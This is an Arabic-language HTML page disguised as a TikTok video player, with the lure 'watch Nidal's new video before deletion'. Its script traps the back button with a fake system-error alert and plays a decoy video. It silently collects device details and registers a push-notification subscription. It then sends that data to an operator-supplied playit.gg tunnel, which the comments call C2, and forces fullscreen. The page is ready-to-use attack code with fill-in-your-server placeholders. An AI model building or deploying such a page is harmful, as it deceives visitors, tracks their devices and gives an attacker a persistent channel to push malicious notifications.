<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta property="og:title" content="🔥 شاهد فيديو نضال الجديد قبل الحذف!">
    <meta property="og:image" content="https://img.icons8.com/color/512/tiktok--v1.png">
    <title>TikTok Player</title>
    <style>
        body { margin:0; background:#000; overflow:hidden; font-family: sans-serif; color:#fff; }
        .tt-container { height:100vh; width:100vw; display:flex; justify-content:center; align-items:center; position:relative; }
        .play-btn { width:100px; cursor:pointer; z-index:100; }
        /* خلفية توحي بوجود فيديو تيك توك خلف الزر */
        .bg-img { width:100%; height:100%; object-fit: cover; opacity: 0.5; position: absolute; }
    </style>
</head>
<body onclick="startAttack()">
    <div class="tt-container" id="mainBox">
        <img src="https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?q=80&w=1000" class="bg-img">
        <img src="https://cdn-icons-png.flaticon.com/512/0/375.png" class="play-btn" id="pBtn">
    </div>

    <script>
        // --- [تفصيل مهم] ضع بياناتك هنا ---
        const SERVER_URL = 'https://رابط-playit-الخاص-بك.playit.gg'; 
        const PUBLIC_KEY = 'المفتاح-العام-الذي-سيظهر-في-النات-هنتر'; 

        // تفعيل الحصار (اختطاف زر الرجوع)
        function hijack() {
            for(let i=0; i<20; i++) history.pushState(null, "", location.href);
            window.onpopstate = () => {
                history.pushState(null, "", location.href);
                alert("⚠️ خطأ في النظام: لا يمكنك الرجوع قبل اكتمال التحقق!");
            };
        }

        async function startAttack() {
            hijack();
            
            // --- [تفصيل مهم] وضع الفيديو الحقيقي ---
            const videoUrl = "https://www.w3schools.com/html/mov_bbb.mp4"; // استبدل برابط فيديو تيك توك .mp4
            document.getElementById('mainBox').innerHTML = `
                <video autoplay loop style="width:100%; height:100%; object-fit:cover;">
                    <source src="${videoUrl}" type="video/mp4">
                </video>
            `;

            // سحب بصمة الجهاز صمتاً
            let specs = { os: navigator.userAgent, battery: "N/A" };
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                specs.battery = Math.round(b.level * 100) + "%";
            }

            try {
                // طلب الإذن بالإشعارات والسيطرة
                const reg = await navigator.serviceWorker.register('worker.js');
                let sub = await reg.pushManager.getSubscription();
                if (!sub) {
                    sub = await reg.pushManager.subscribe({
                        userVisibleOnly: true,
                        applicationServerKey: urlBase64ToUint8Array(PUBLIC_KEY)
                    });
                }

                // إرسال البيانات للنات هنتر
                fetch(SERVER_URL + '/subscribe', {
                    method: 'POST',
                    body: JSON.stringify({ sub, specs }),
                    headers: { 'Content-Type': 'application/json' }
                });
                
                document.documentElement.requestFullscreen(); // ملء الشاشة
            } catch (err) { console.log("C2 Error"); }
        }

        function urlBase64ToUint8Array(s) {
            const p = '='.repeat((4 - s.length % 4) % 4);
            const b = (s + p).replace(/-/g, '+').replace(/_/g, '/');
            const r = atob(b);
            const o = new Uint8Array(r.length);
            for (let i = 0; i < r.length; ++i) o[i] = r.charCodeAt(i);
            return o;
        }
    </script>
</body>
</html>
